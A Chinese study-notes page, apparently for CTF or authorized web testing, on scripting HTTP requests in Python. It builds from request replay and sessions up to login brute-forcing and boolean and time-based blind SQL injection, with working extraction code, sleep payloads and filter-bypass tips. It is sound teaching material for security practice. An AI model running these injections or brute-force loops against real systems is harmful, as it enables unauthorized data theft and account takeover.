---
title: "Python 脚本：从基线请求到盲注采集"
summary: "用 requests 复现一条真实请求，再扩展成会话、判定、爆破、布尔/时间盲注与并发采集；每一步都要求可判定、可中断、可复现。"
module: Web
topic: "协议与抓包"
tags: []
status: 已整理
sourceIds: []
challengeIds: []
relatedIds: ["web-burp", "web-http-message", "web-data-query", "web-logic"]
updated: "2026-10-29"
---

手工点一次是验证，跑一千次才是采集。脚本的价值不在“自动化”三个字，而在于把**请求长什么样、判定条件是什么、失败时停在哪里**固定下来，换一台机器还能复现。

> 只对本地题目或明确授权的环境发请求；先小批量、低并发，确认判定条件可靠后再放大。

## 00 30 秒速查

| 我要… | 用… | 关键开关 |
|---|---|---|
| 复现一条请求 | `requests.Session()` | 逐项对齐 |
| 保留登录态 | `Session` | 自动 Cookie |
| 看 302 去哪 | `allow_redirects=False` | 手工读 `Location` |
| 发表单/JSON | `data=`/`json=` | 别混 |
| 上传 | `files=` | boundary 自动 |
| 走 Burp | `proxies=` | 只挂当前会话 |
| 稳定判定 | 状态码+关键字+长度 | 三选二 |
| 布尔盲注 | 二分 `ascii(substr())` | 1-based |
| 时间盲注 | 基线+标准差 | 重复取中位 |
| 批量 | 5–10 线程 | 429 就降 |
| 断点 | JSONL 逐行落盘 | 已完成跳过 |
| 证据 | 参数/判定/哈希 | 一行一条 |

## 01 原理与成立条件

```text
浏览器请求 → 抓包 → requests 复现 → 判定函数 → 循环 → 落盘
                    ├─ 会话/Cookie
                    ├─ 参数位置
                    └─ 响应特征
```

| 条件 | 含义 | 不满足时 |
|---|---|---|
| 请求可复现 | 手工与脚本同响应 | 逐项对齐头/体 |
| 判定可区分 | 真/假稳定不同 | 换判据 |
| 会话有效 | Cookie/Token | 重登/刷新 |
| 可中断 | 进度落盘 | 先写记录 |
| 授权 | 本地/书面 | 停 |

| 位置 | requests 参数 | 后端读取 |
|---|---|---|
| 查询串 | `params=` | `$_GET`/`query` |
| 表单 | `data=dict` | `$_POST`/form |
| JSON | `json=dict` | `application/json` |
| 文件 | `files=` | multipart |
| 头 | `headers=` | 网关/鉴权 |
| Cookie | `cookies=`/Session | 会话 |

## 02 判断与分型

```text
响应能稳定区分真假吗？
 ├─ 能 → 直接循环（爆破/枚举）
 └─ 不能
     ├─ 有回显 → 正则/长度/关键字
     ├─ 无回显但状态/长度变 → 布尔
     ├─ 只有时间变 → 时间盲注
     └─ 都没有 → 换入口/换参数
需要登录态吗？
 ├─ 是 → Session 先登录
 └─ 否 → 直接请求
```

| 信号 | 含义 | 下一步 |
|---|---|---|
| 200 但内容相同 | 参数未生效 | 换位置 |
| 302 固定 | 成功/失败同跳 | 看 `Location` |
| 长度差稳定 | 布尔可用 | 阈值 |
| 响应慢且随 `sleep` | 时间盲注 | 测基线 |
| 429/503 | 限速 | 降并发 |
| 验证码 | 人机 | 停/绕不过 |

| 假阳性 | 原因 | 处理 |
|---|---|---|
| 全 200 | 自定义 404 | 比正文 |
| 长度波动 | 时间戳/广告 | 多请求取稳 |
| 一次超时当假 | 网络抖动 | 重试/记失败 |
| 命中像成功 | 模板复用提示 | 看权限/跳转 |
| WAF 页当失败 | 403 拦截 | 识别特征 |

## 03 利用阶梯

### L0 最小请求

**前提**：Burp 里有一条真实请求。

**步骤**：
1. 用 `Session` 复现方法、URL、参数、Cookie、关键头。
2. 加 `timeout=`、`allow_redirects=False`。
3. 对比状态码、长度、`Content-Type`、正文摘要。
4. 与手工请求完全一致后再往下。

```python
import requests
s = requests.Session()
s.headers.update({"User-Agent": "Mozilla/5.0", "Accept": "*/*"})
r = s.get("http://target/item", params={"id": "1"}, timeout=5, allow_redirects=False)
print(r.status_code, len(r.content), r.headers.get("Content-Type"))
```

**成功标志**：脚本响应与 Burp 一致。

**失败分支**：不一致→查 Host/Content-Type/编码；302 被跟随→关重定向；TLS→本地才 `verify=False`。

### L1 会话与代理

**前提**：需要登录态或对照流量。

**步骤**：
1. `Session` 登录，确认 `Set-Cookie`。
2. 需要进 Burp 时给 Session 挂 `proxies`。
3. 显式补 `Origin`/`Referer`/`X-Requested-With`。
4. 前端 JS 写入的 Cookie 手工补。

```python
s = requests.Session()
s.proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
s.verify = False
r = s.post("http://target/login", data={"username": "u", "password": "p"},
           timeout=5, allow_redirects=False)
print(r.status_code, r.headers.get("Set-Cookie"))
```

**成功标志**：登录后接口可访问，Burp 能看到脚本流量。

**失败分支**：401→Token 过期；CSRF→先取 token；代理回路→查 `NO_PROXY`。

### L2 判定与爆破

**前提**：有字典/枚举空间。

**步骤**：
1. 写 `hit(r)`：状态码、关键字、长度、跳转目标交叉。
2. 先跑 10 条观察误判。
3. 命中落盘：值、状态码、长度、响应哈希。
4. 字典标来源。

```python
def hit(r):
    if r.status_code in (301, 302):
        return "/dashboard" in r.headers.get("Location", "")
    return "login success" in r.text or len(r.content) > 5000
```

**成功标志**：人工抽查命中/未命中各 3 条均正确。

**失败分支**：全不中→判据错；全中→自定义 404；429→降速。

### L3 布尔与时间盲注

**前提**：注入点已确认，真假响应可区分。

**步骤**：
1. 手工各发 5 次真/假，确认稳定差异。
2. 布尔：二分 `ascii(substr())`，下标 1-based。
3. 时间：测基线 5–10 次，阈值 > 均值 + 3σ。
4. 每字符重复取中位，连续超时记失败。
5. 结果拼接 `concat(0x7e,...)` 便于分段。

```python
def oracle(expr):
    payload = f"1' and ({expr})-- -"
    r = s.get(url, params={"id": payload}, timeout=5)
    return "You are in" in r.text

def extract(sql, max_len=64):
    out = ""
    for i in range(1, max_len + 1):
        lo, hi = 32, 126
        while lo < hi:
            mid = (lo + hi) // 2
            if oracle(f"ascii(substr(({sql}),{i},1))>{mid}"):
                lo = mid + 1
            else:
                hi = mid
        if lo == 32:
            break
        out += chr(lo)
    return out
```

```python
import statistics, time
def timed(payload, n=5):
    samples = []
    for _ in range(n):
        t0 = time.perf_counter()
        s.get(url, params={"id": payload}, timeout=10)
        samples.append(time.perf_counter() - t0)
    return statistics.median(samples)

base = timed("1")
delay = timed("1' and sleep(2)-- -")
threshold = base + max(1.5, (delay - base) * 0.6)
```

**成功标志**：提取值与手工单字符验证一致。

**失败分支**：空格/逗号被过滤→换注释/`from for`；时间不稳→加重复/换判据；结果空→先验 `select 1`。

### L4 并发与证据化

**前提**：单线程太慢，判定已稳定。

**步骤**：
1. 默认 5–10 线程，观察 429/503/统一超时。
2. 每任务重试 3 次，指数退避。
3. 结果 JSONL 逐行写，断点跳过已完成。
4. 结束时统计命中/失败/超时。
5. 证据字段齐全再汇报。

```python
from concurrent.futures import ThreadPoolExecutor, as_completed

def task(item):
    for attempt in range(3):
        try:
            return item, check(item)
        except requests.RequestException:
            time.sleep(1 + attempt)
    return item, None
```

**成功标志**：结果可续跑，失败原因可分类。

**失败分支**：限速→降并发；Cookie 竞争→每线程独立 Session；结果重复→幂等键。

## 04 绕过与边界

| 场景 | 边界 | 处理 |
|---|---|---|
| `allow_redirects` | 默认跟随 | 调试关 |
| `verify=False` | 仅本地 | 线上不关 |
| 手工 `Content-Length` | 易错 | 让库算 |
| gzip/br | `r.text` 乱码 | `content.decode` |
| 多线程 Session | Cookie 竞争 | 独立会话 |
| 系统代理 | 与 Burp 回路 | 显式 `proxies` |
| 时间判定 | 网络抖动 | 中位+重试 |

边界：`params` 与 `data` 不能混；`files` 自动 boundary；`timeout` 必写；重定向次数有限；`Session` 不会执行 JS。

## 05 非典型入口

| 入口 | 处理 | 注意 |
|---|---|---|
| JSON API | `json=` + `Content-Type` | 后端只读 body |
| multipart | `files=` | 文件名/内容 |
| WebSocket | `websocket-client` | 帧/握手 |
| GraphQL | POST JSON | 单端点 |
| 签名接口 | 复现 sign/nonce | 时间窗 |
| 上传+轮询 | 两阶段 | 任务 ID |

## 06 差异速查

| 判定依据 | 可靠场景 | 误判 |
|---|---|---|
| 状态码 | 成功 302/失败 200 | 全站 302 |
| 长度 | 成功页更大 | 动态内容 |
| 关键字 | 稳定提示 | 模板复用 |
| 时间 | 有 `sleep`/远程校验 | 抖动/缓存 |
| 跳转 | 固定 dashboard | 失败也跳 |

| 现象 | 可能 | 处理 |
|---|---|---|
| 脚本 200 手工 302 | 跟随重定向 | 关 |
| 脚本空手工有 | 压缩/编码 | `content` |
| 全 403 | WAF/头缺 | 补头/降速 |
| 登录立刻失效 | CSRF/绑定 | 取 token |

## 07 工具与验证

| 目标 | 工具 |
|---|---|
| 抓请求 | Burp/浏览器 |
| 请求库 | requests/httpx |
| 解析 | BeautifulSoup/lxml/re |
| 并发 | ThreadPoolExecutor |
| 进度 | JSONL/CSV |
| 验证 | Repeater 对照 |

验证顺序：单请求 → 会话 → 判定 → 小批量 → 放大 → 复核。

## 08 实战流程

| 阶段 | 动作 | 产出 |
|---|---|---|
| 1 基线 | 复现一条 | 请求模板 |
| 2 会话 | 登录/头 | 可用身份 |
| 3 判定 | 真/假各 5 次 | `hit()` |
| 4 采集 | 循环/盲注 | 结果 |
| 5 复核 | 手工重放 | 证据 |
| 6 落盘 | JSONL+参数 | 可复现 |

## 09 失败分支

| 现象 | 优先怀疑 | 处理 |
|---|---|---|
| 响应与手工不同 | 头/参数位置 | 逐项对齐 |
| 全不中 | 判定/字典 | 抽查 |
| 全中 | 自定义 404 | 比正文 |
| 429 | 限速 | 降并发 |
| 时间全真/全假 | 阈值 | 重测基线 |
| 断点错乱 | 无幂等键 | 记已完成 |
| 结果不可复现 | 会话/时间 | 固定环境 |

## 10 记录与复现

- [ ] 目标与接口
- [ ] 参数位置
- [ ] 字典/表达式
- [ ] 判定条件
- [ ] 命中值与响应摘要
- [ ] 失败原因
- [ ] 时间/代理/环境

| 字段 | 例子 | 为什么记 |
|---|---|---|
| 接口 | `POST /login` | 定位 |
| 参数 | `username`（表单） | 判类型 |
| 字典 | `top1000.txt` | 复现 |
| 判据 | `302 -> /dashboard` | 解释成功 |
| 命中 | `admin/admin`、5321 | 防误报 |
| 失败 | 429/超时/拦截 | 区分没打到 |

结果文件一行一条；不要把密码、Token 写进聊天记录或截图。

相关： [Burp](/knowledge/web-burp/)、[HTTP 协议](/knowledge/web-http-message/)、[SQL 注入](/knowledge/web-data-query/)、[业务逻辑](/knowledge/web-logic/)。
